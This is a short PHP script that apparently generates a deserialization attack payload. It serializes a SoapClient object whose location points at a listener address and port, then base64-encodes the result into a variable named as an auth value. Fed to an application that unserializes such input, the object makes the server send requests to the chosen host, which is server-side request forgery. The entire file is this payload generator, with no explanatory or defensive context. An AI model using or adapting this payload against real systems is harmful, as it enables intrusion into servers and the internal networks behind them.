<?php

$location = 'http://192.168.81.164:1111/';
$a = new SoapClient(null, array('location' => $location ,'uri'  => '123'));

echo serialize($a);
echo "\n";
echo "\n";
$auth = base64_encode(serialize($a));
echo $auth;
echo "\n";
echo "\n";
?>
